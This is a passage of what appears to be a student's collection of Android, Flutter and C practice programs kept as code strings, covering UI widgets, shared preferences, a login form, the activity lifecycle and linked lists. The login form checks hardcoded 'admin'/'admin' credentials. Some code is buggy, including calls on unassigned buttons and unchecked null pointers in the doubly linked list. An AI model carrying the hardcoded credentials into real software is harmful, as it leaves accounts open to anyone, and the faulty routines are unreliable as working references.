    android:layout_height="match_parent"
    tools:context=".checkBox">

    <CheckBox
        android:id="@+id/checkBox1"
        android:layout_width="91dp"
        android:layout_height="40dp"
        android:text="Option 1"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <CheckBox
        android:id="@+id/checkBox2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Option 2"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/checkBox1" />


</androidx.constraintlayout.widget.ConstraintLayout>



'''

dateTime = '''
package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.app.DatePickerDialog;
import android.app.TimePickerDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.DatePicker;
import android.widget.TextView;
import android.widget.TimePicker;

import java.util.Calendar;

public class dateTimeAct extends AppCompatActivity {
    TextView tvDate1, tvTime2;
    int d1Year, d1Month, d1Day, t2Hour, t2Minute;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_date_time);
        tvDate1 = findViewById(R.id.tv_date1);
        tvTime2 = findViewById(R.id.tv_date2);

        // Set OnClickListener for the first date TextView
        tvDate1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Initialize DatePickerDialog
                Calendar calendar = Calendar.getInstance();
                d1Year = calendar.get(Calendar.YEAR);
                d1Month = calendar.get(Calendar.MONTH);
                d1Day = calendar.get(Calendar.DAY_OF_MONTH);

                DatePickerDialog datePickerDialog = new DatePickerDialog(
                        dateTimeAct.this,
                        new DatePickerDialog.OnDateSetListener() {
                            @Override
                            public void onDateSet(DatePicker view, int year, int month, int dayOfMonth) {
                                // Update year, month, and day
                                d1Year = year;
                                d1Month = month;
                                d1Day = dayOfMonth;

                                // Set selected date in TextView
                                tvDate1.setText(dayOfMonth + "/" + (month + 1) + "/" + year);
                            }
                        }, d1Year, d1Month, d1Day);
                datePickerDialog.show();
            }
        });

        // Set OnClickListener for the second date TextView
        tvTime2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Initialize TimePickerDialog
                Calendar calendar = Calendar.getInstance();
                t2Hour = calendar.get(Calendar.HOUR_OF_DAY);
                t2Minute = calendar.get(Calendar.MINUTE);

                TimePickerDialog timePickerDialog = new TimePickerDialog(
                        dateTimeAct.this,
                        new TimePickerDialog.OnTimeSetListener() {
                            @Override
                            public void onTimeSet(TimePicker view, int hourOfDay, int minute) {
                                // Update hour and minute
                                t2Hour = hourOfDay;
                                t2Minute = minute;

                                // Set selected time in 12-hour format
                                tvTime2.setText(String.format("%02d:%02d %s",
                                        (t2Hour % 12 == 0 ? 12 : t2Hour % 12), t2Minute, (t2Hour < 12 ? "AM" : "PM")));
                            }
                        }, t2Hour, t2Minute, false); // 'false' for 12-hour format
                timePickerDialog.show();
            }
        });
    }
}

xml:
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/tv_date1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Select Date 1"
        android:textSize="32sp"
        android:textStyle="bold"
        android:gravity="center"
        android:drawablePadding="16dp"
        android:background="@android:drawable/editbox_background"
        android:padding="16dp"/>

    <TextView
        android:id="@+id/tv_date2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Select Date 2"
        android:textSize="32sp"
        android:textStyle="bold"
        android:gravity="center"
        android:drawablePadding="16dp"
        android:background="@android:drawable/editbox_background"
        android:padding="16dp"
        android:layout_marginTop="16dp"/>

</LinearLayout>


'''

oneActToOtherAndToast = ''' 

package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    Button btn1, btn2;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        btn1.findViewById(R.id.button);
        btn2.findViewById(R.id.button2);

        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.this,"Toast Msg",Toast.LENGTH_LONG).show();
            }
        });
        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent(MainActivity.this, SharedPrefAct.class);
                startActivity(i);

            }
        });

    }
}

xml:

<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/textView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Hello World!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <Button
        android:id="@+id/button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Button"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/textView" />
    <Button
        android:id="@+id/button2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Next"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/button" />

</androidx.constraintlayout.widget.ConstraintLayout>
'''

radiobtn='''
package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Toast;

public class RadioBtnAct extends AppCompatActivity {
   RadioGroup rdgrp;
   RadioButton rdbtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_radio_btn);


        rdgrp = findViewById(R.id.rdgrp);
        rdgrp.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                rdbtn = findViewById(checkedId);
                Toast.makeText(RadioBtnAct.this , "Selected option : " + rdbtn.getText(), Toast.LENGTH_SHORT).show();
            }
        });


    }
}

xml:
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".RadioBtnAct">

    <RadioGroup
        android:id="@+id/rdgrp"

        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent">


        <RadioButton
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="opt 1"/>
        <RadioButton
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="opt 2"/>
        <RadioButton
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="opt 3"/>

    </RadioGroup>
</androidx.constraintlayout.widget.ConstraintLayout>

'''

sharedPrefrence='''
package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class SharedPrefAct extends AppCompatActivity {
    EditText editTextUsername;
    Button buttonSave;

    ListView listViewUsernames;

    ArrayAdapter<String> adapter;
    List<String> usernameList ;

    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_shared_pref);
        editTextUsername = findViewById(R.id.editTextUsername);
        buttonSave = findViewById(R.id.buttonSave);
        listViewUsernames = findViewById(R.id.listViewUsernames);

        // Initialize SharedPreferences
        sharedPreferences = getSharedPreferences("MyPref", Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();

        // Initialize the list and adapter
        usernameList = new ArrayList<>();
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, usernameList);
        listViewUsernames.setAdapter(adapter);

        // Load previously saved usernames and update the ListView
        loadUsernames();

        // Set up the Save button's OnClickListener
        buttonSave.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String username = editTextUsername.getText().toString().trim();

                if (!username.isEmpty()) {
                    // Save username to SharedPreferences
                    saveUsername(username);
                    // Clear the input field
                    editTextUsername.setText("");
                    // Show confirmation message
                    Toast.makeText(SharedPrefAct.this, "Username saved!", Toast.LENGTH_SHORT).show();
                    // Update the ListView with the new username
                    loadUsernames();
                } else {
                    Toast.makeText(SharedPrefAct.this, "Please enter a username", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    // Function to save username to SharedPreferences
    private void saveUsername(String username) {
        // Retrieve existing usernames from SharedPreferences
        Set<String> usernameSet = sharedPreferences.getStringSet("usernames", new HashSet<>());

        // Add the new username
        usernameSet.add(username);

        // Save the updated set back to SharedPreferences
        editor.putStringSet("usernames", usernameSet);
        editor.apply();  // Apply changes
    }

    // Function to load usernames from SharedPreferences and update the ListView
    private void loadUsernames() {
        // Clear the current list
        usernameList.clear();

        // Retrieve the usernames from SharedPreferences
        Set<String> usernameSet = sharedPreferences.getStringSet("usernames", new HashSet<>());

        // Add all usernames to the list
        usernameList.addAll(usernameSet);

        // Notify the adapter to refresh the ListView
        adapter.notifyDataSetChanged();
    }
}


xml:

<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".SharedPrefAct">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical"
        android:padding="16dp"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent">

        <EditText
            android:id="@+id/editTextUsername"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:hint="Enter username" />

        <Button
            android:id="@+id/buttonSave"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Save" />
        <ListView
            android:id="@+id/listViewUsernames"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />

    </LinearLayout>

</androidx.constraintlayout.widget.ConstraintLayout>


'''

loginForm = '''
java code :

package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

public class loginFormAct extends AppCompatActivity {
    EditText username, password;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login_form);
        username = findViewById(R.id.username);
        password = findViewById(R.id.password);
    }

    public void login(View view) {
        String user = username.getText().toString();
        String pass = password.getText().toString();

        if (user.equals("admin") && pass.equals("admin")) {
            Toast.makeText(this, "Login successful", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Invalid credentials", Toast.LENGTH_SHORT).show();
        }
    }
}

xml:


<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".loginFormAct">


    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical">
        <EditText
            android:id="@+id/username"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:hint="Username" />

        <EditText
            android:id="@+id/password"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:hint="Password"

            android:inputType="textPassword" />

        <Button
            android:id="@+id/loginButton"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Login" />

    </LinearLayout>

</androidx.constraintlayout.widget.ConstraintLayout>


'''

lifecycle = '''
act1 java:
package com.example.activitylifecycle2;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toast.makeText(this, "onCreate", Toast.LENGTH_SHORT).show();
        
        // Set up the TextView to navigate to SecondActivity
        TextView textView = findViewById(R.id.FirstActivity);
        textView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                startActivity(intent);
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        Toast.makeText(this, "onStart", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Toast.makeText(this, "onResume", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onPause() {
        super.onPause();
        Toast.makeText(this, "onPause", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onStop() {
        super.onStop();
        Toast.makeText(this, "onStop", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        Toast.makeText(this, "onRestart", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "onDestroy", Toast.LENGTH_SHORT).show();
    }
}


act1 xml:
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/FirstActivity"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="First Activity!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />
</androidx.constraintlayout.widget.ConstraintLayout>


act2 java:
package com.example.activitylifecycle2;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

public class SecondActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);
        Toast toast = Toast.makeText(this, "SecondCreate", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();

        // Set up the TextView to navigate to ThirdActivity
        TextView textView = findViewById(R.id.SecondActivity);
        textView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(SecondActivity.this, ThirdActivity.class);
                startActivity(intent);
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        Toast toast = Toast.makeText(this, "SecondStart", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Toast toast = Toast.makeText(this, "SecondResume", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    @Override
    protected void onPause() {
        super.onPause();
        Toast toast = Toast.makeText(this, "SecondPause", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    @Override
    protected void onStop() {
        super.onStop();
        Toast toast = Toast.makeText(this, "SecondStop", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        Toast toast = Toast.makeText(this, "SecondRestart", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Toast toast = Toast.makeText(this, "SecondDestroy", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }
}

act2 xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".SecondActivity">

    <TextView
        android:id="@+id/SecondActivity"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Second Activity!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />
</androidx.constraintlayout.widget.ConstraintLayout>


act3 java:
package com.example.activitylifecycle2;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.Toast;

public class ThirdActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_third);
        Toast toast = Toast.makeText(this, "ThirdCreate", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onStart() {
        super.onStart();
        Toast toast = Toast.makeText(this, "ThirdStart", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Toast toast = Toast.makeText(this, "ThirdResume", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onPause() {
        super.onPause();
        Toast toast = Toast.makeText(this, "ThirdPause", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onStop() {
        super.onStop();
        Toast toast = Toast.makeText(this, "ThirdStop", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        Toast toast = Toast.makeText(this, "ThirdRestart", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Toast toast = Toast.makeText(this, "ThirdDestroy", Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.show();
    }
}


act3 xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".ThirdActivity">

    <TextView
        android:id="@+id/ThirdActivity"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Third Activity!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />
</androidx.constraintlayout.widget.ConstraintLayout>



'''

fluterexp1 = '''
import 'package:flutter/material.dart';

class HelloWorld extends StatefulWidget {
  const HelloWorld({super.key});

  @override
  State<HelloWorld> createState() => _HelloWorldState();
}

class _HelloWorldState extends State<HelloWorld> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("Hello App"),
      ),
      body: Center(
        child: Text("Hello World!!"),
      ),
    );
  }
}
'''

flutterexp2 = '''
import 'package:flutter/material.dart';

class RowAndCol extends StatefulWidget {
  const RowAndCol({super.key});

  @override
  State<RowAndCol> createState() => _RowAndColState();
}

class _RowAndColState extends State<RowAndCol> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("Rows"),
      ),
      body: Center(
        child: Row(
          children: [
            Column(
              children: [
                Container(
                  height: 100,
                  width: 100,
                  color: Colors.red,
                ),
                Container(
                  height: 100,
                  width: 100,
                  color: Colors.blue,
                ),
              ],
            ),
            Column(
              children: [
                Container(
                  height: 100,
                  width: 100,
                  color: Colors.blue,
                ),
                Container(
                  height: 100,
                  width: 100,
                  color: Colors.red,
                ),
              ],
            )
          ],
        ),
      ),
    );
  }
}

'''

singly_linked_list = '''
#include <stdio.h>
#include <stdlib.h>

struct Node {
    int data;
    struct Node* next;
} *head = NULL;

struct Node* temp;

struct Node* createNode(int data) {
    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
    if (!newNode) {
        printf("Memory allocation failed\n");
        exit(1);
    }
    newNode->data = data;
    newNode->next = NULL;
    return newNode;
}

void insertAtEnd(int data) {
    struct Node* newNode = createNode(data);
    if (head == NULL) {
        head = newNode;
        return;
    }
    temp = head;
    while (temp->next != NULL) {
        temp = temp->next;
    }
    temp->next = newNode;
}

void insertAtStart(int data) {
    struct Node* newNode = createNode(data);
    newNode->next = head;
    head = newNode;
}

void insertAtNPosition(int data, int position) {
    if (position == 0) {
        insertAtStart(data);
        return;
    }

    struct Node* newNode = createNode(data);
    temp = head;
    for (int i = 0; temp != NULL && i < position - 1; i++) {
        temp = temp->next;
    }
    
    if (temp == NULL) { // Position is out of bounds
        printf("Invalid position\n");
        free(newNode);
        return;
    }

    newNode->next = temp->next;
    temp->next = newNode;
}

void deleteAtFirst() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    temp = head;
    head = head->next;
    free(temp);
}

void deleteAtEnd() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (head->next == NULL) {
        free(head);
        head = NULL;
        return;
    }
    struct Node* prev = NULL;
    temp = head;
    while (temp->next != NULL) {
        prev = temp;
        temp = temp->next;
    }
    prev->next = NULL;
    free(temp);
}

void deleteNPosition(int position) {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (position == 0) {
        deleteAtFirst();
        return;
    }

    temp = head;
    struct Node* prev = NULL;

    for (int i = 0; temp != NULL && i < position; i++) {
        prev = temp;
        temp = temp->next;
    }

    if (temp == NULL) {
        printf("Invalid position\n");
        return;
    }

    prev->next = temp->next;
    free(temp);
}

void display() {
    temp = head;
    while (temp != NULL) {
        printf("%d -> ", temp->data);
        temp = temp->next;
    }
    printf("NULL\n");
}

int main() {
    insertAtEnd(1);
    insertAtEnd(2);
    insertAtEnd(3);
    insertAtEnd(4);
    insertAtEnd(5);
    insertAtStart(5);
    insertAtNPosition(15, 2);
    deleteAtFirst();
    deleteAtEnd();
    deleteNPosition(1);
    display();
    return 0;
}
'''

doubly_linked_list = '''
#include <stdio.h>
#include <stdlib.h>

struct Node{
    int data;
    struct Node* next;
    struct Node* prev;
}*head=NULL;

struct Node* temp;

struct Node* createNode(int data)
{
    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
    newNode->data=data;
    newNode->next=NULL;
    newNode->prev=NULL;
    return newNode;
}

void insertAtEnd(int data)
{
    struct Node* newNode = createNode(data);
    if(head==NULL)
    {
     head=newNode;
     return;
    }
    temp=head;
    while(temp->next!=NULL)
    {
        temp=temp->next;
    }
    temp->next=newNode;
    newNode->prev=temp;
    newNode->next=NULL;
}

void insertAtStart(int data)
{
struct Node* newNode = createNode(data);
if(head==NULL)
    {
     head=newNode;
     return;
    }
newNode->next=head;
newNode->prev=NULL;
head->prev=newNode;
head=newNode;
}

void insertAtNPosition(int data, int position){
    struct Node* newNode = createNode(data);
    temp=head;
    for(int i=0; temp!=NULL && i<position-1; i++){
        temp=temp->next;
    }
    newNode->next=temp->next;
    newNode->prev=temp;
    if(temp->next!=NULL){
        temp->next->prev=newNode;
    }
    temp->next=newNode;
}

void deleteAtFirst(){
    temp=head;
    head=head->next;
    head->prev=NULL;
    free(temp);
}

void deleteAtEnd(){
    temp=head;
    while(temp->next!=NULL){
        temp=temp->next;
    }
    temp->prev->next=NULL;
    free(temp);
}

void deleteNPosition(int position){
temp=head;
for(int i=0; temp!=NULL && i<position; i++){
    temp=temp->next;
}
temp->next->prev=temp->prev;
temp->prev->next=temp->next;
free(temp);
}

void display()
{
    temp=head;
    while(temp!=NULL)
    {
        printf("%d -> ", temp->data);
        temp=temp->next;
    }
    printf("NULL\n");
}

void displayBackward()
{
    temp=head;
    while(temp->next!=NULL){
        temp=temp->next;
    }
    while(temp!=NULL){
        printf("%d -> ",temp->data);
        temp=temp->prev;
    }
    printf("NULL");
}

int main()
{
    insertAtEnd(1);
    insertAtEnd(2);
    insertAtEnd(3);
    insertAtEnd(4);
    insertAtEnd(5);
    insertAtStart(5);
    insertAtNPosition(15,2);
    deleteAtFirst();
    deleteAtEnd();
    deleteNPosition(1);
    display();
    displayBackward();
}
'''

circular_linked_list = '''
#include <stdio.h>
#include <stdlib.h>

struct Node {
    int data;
    struct Node* next;
} *head = NULL;

struct Node* tail = NULL; 

struct Node* createNode(int data) {
    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
    if (!newNode) {
        printf("Memory allocation failed\n");
        exit(1);
    }
    newNode->data = data;
    newNode->next = NULL;
    return newNode;
}

void insertAtEnd(int data) {
    struct Node* newNode = createNode(data);
    if (head == NULL) {
        head = newNode;
        tail = newNode;
        tail->next = head;
        return;
    }
    tail->next = newNode;
    tail = newNode;
    tail->next = head;
}

void insertAtStart(int data) {
    struct Node* newNode = createNode(data);
    if (head == NULL) {
        head = newNode;
        tail = newNode;
        tail->next = head;
        return;
    }
    newNode->next = head;
    head = newNode;
    tail->next = head;
}

void insertAtNPosition(int data, int position) {
    if (position == 0) {
        insertAtStart(data);
        return;
    }

    struct Node* newNode = createNode(data);
    struct Node* temp = head;

    for (int i = 0; i < position - 1 && temp->next != head; i++) {
        temp = temp->next;
    }

    if (temp->next == head && position > 0) {
        printf("Invalid position\n");
        free(newNode);
        return;
    }

    newNode->next = temp->next;
    temp->next = newNode;

    if (temp == tail) {
        tail = newNode;
    }
}

void deleteAtFirst() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    struct Node* temp = head;

    if (head == tail) {
        head = NULL;
        tail = NULL;
    } else {
        head = head->next;
        tail->next = head;
    }

    free(temp);
}

void deleteAtEnd() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (head == tail) {
        free(head);
        head = NULL;
        tail = NULL;
        return;
    }
    
    struct Node* temp = head;
    while (temp->next != tail) {
        temp = temp->next;
    }

    free(tail);
    tail = temp;
    tail->next = head;
}

void deleteNPosition(int position) {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (position == 0) {
        deleteAtFirst();
        return;
    }

    struct Node* temp = head;
    struct Node* prev = NULL;

    for (int i = 0; i < position && temp->next != head; i++) {
        prev = temp;
        temp = temp->next;
    }

    if (temp == head) {
        printf("Invalid position\n");
        return;
    }

    prev->next = temp->next;

    if (temp == tail) {
        tail = prev;
    }

    free(temp);
}

void display() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    
    struct Node* temp = head;
    do {
        printf("%d -> ", temp->data);
        temp = temp->next;
    } while (temp != head);

    printf("%d(back to head)\n", head->data);
}

int main() {
    insertAtEnd(1);
    insertAtEnd(2);
    insertAtEnd(3);
    insertAtEnd(4);
    insertAtEnd(5);
    insertAtStart(10);
    insertAtNPosition(15, 2);
    display();

    deleteAtFirst();
    deleteAtEnd();
    deleteNPosition(2);
    display();

    return 0;
}
'''

doubly_circular_linked_list = '''
#include <stdio.h>
#include <stdlib.h>

struct Node {
    int data;
    struct Node* next;
    struct Node* prev;
};

struct Node* head = NULL;
struct Node* tail = NULL;

struct Node* createNode(int data) {
    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
    if (!newNode) {
        printf("Memory allocation failed\n");
        exit(1);
    }
    newNode->data = data;
    newNode->next = newNode->prev = NULL;
    return newNode;
}

void insertAtEnd(int data) {
    struct Node* newNode = createNode(data);
    if (head == NULL) {
        head = tail = newNode;
        head->next = head->prev = head;
        return;
    }
    newNode->prev = tail;
    newNode->next = head;
    tail->next = newNode;
    head->prev = newNode;
    tail = newNode;
}

void insertAtStart(int data) {
    struct Node* newNode = createNode(data);
    if (head == NULL) {
        head = tail = newNode;
        head->next = head->prev = head;
        return;
    }
    newNode->next = head;
    newNode->prev = tail;
    tail->next = newNode;
    head->prev = newNode;
    head = newNode;
}

void insertAtNPosition(int data, int position) {
    if (position == 0) {
        insertAtStart(data);
        return;
    }

    struct Node* newNode = createNode(data);
    struct Node* temp = head;
    
    for (int i = 0; i < position - 1 && temp->next != head; i++) {
        temp = temp->next;
    }

